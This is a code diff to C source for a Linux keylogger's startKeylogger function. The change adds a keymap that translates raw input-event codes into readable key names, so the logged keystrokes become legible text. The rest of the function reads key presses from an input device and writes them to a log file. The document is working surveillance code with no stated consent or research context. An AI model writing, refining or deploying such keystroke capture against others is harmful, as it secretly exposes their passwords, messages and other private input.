@@ -268,6 +268,16 @@ void startKeylogger(const char* logfile) {
     time_t t;
     struct tm* tm_info;
 
+    // keymap
+    const char* keymap[] = {
+        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
+        "-", "=", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
+        "O", "P", "[", "]", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H",
+        "J", "K", "L", ";", "'", "`", "LEFTSHIFT", "\\", "Z", "X", "C", "V",
+        "B", "N", "M", ",", ".", "/", "RIGHTSHIFT", "KP*",
+        "LEFTALT", "SPACE", "CAPSLOCK", 
+    };
+
     // Open the input device for reading
     fd = open(DEVICE_PATH, O_RDONLY);
     if (fd == -1) {
@@ -298,10 +308,16 @@ void startKeylogger(const char* logfile) {
         // Read input events
         ssize_t bytesRead = read(fd, &ev, sizeof(ev));
         if (bytesRead == sizeof(ev)) {
-            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
-                char keyInfo[64];
-                snprintf(keyInfo, sizeof(keyInfo), "Key %d pressed\n", ev.code);
-                write(logfd, keyInfo, strlen(keyInfo));
+            if (ev.type == EV_KEY && ev.value == 1) { 
+                if (ev.code < sizeof(keymap) / sizeof(keymap[0])) {
+                    char keyInfo[64];
+                    snprintf(keyInfo, sizeof(keyInfo), "Key %s pressed\n", keymap[ev.code]);
+                    write(logfd, keyInfo, strlen(keyInfo));
+                } else {
+                    char unknownKey[64];
+                    snprintf(unknownKey, sizeof(unknownKey), "Unknown key %d pressed\n", ev.code);
+                    write(logfd, unknownKey, strlen(unknownKey));
+                }
             }
         }
     }
@@ -311,6 +327,7 @@ void startKeylogger(const char* logfile) {
     close(logfd);
     printf("Keylogger stopped.\n");
 }
+
 
 void sigint_handler(int sig) {
     running = 0;
